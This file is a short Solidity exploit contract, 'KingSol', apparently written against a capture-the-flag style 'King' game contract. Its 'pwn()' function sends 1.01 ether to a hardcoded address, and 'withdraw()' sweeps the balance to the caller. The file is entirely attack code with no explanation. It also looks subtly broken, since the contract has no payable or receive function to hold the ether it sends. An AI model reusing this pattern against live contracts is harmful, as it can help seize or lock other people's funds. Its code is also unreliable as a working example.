// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingSol {

  function pwn() external {
      address payable _addr = payable(0xE47985bc18a0bf9C90Fd8d5316Cd1Ac04e79fa86);
      _addr.call{value: 1.01 ether}(abi.encodeWithSignature("pwn()"));
  }

  function withdraw() external {
      payable(msg.sender).transfer(address(this).balance);
  }
}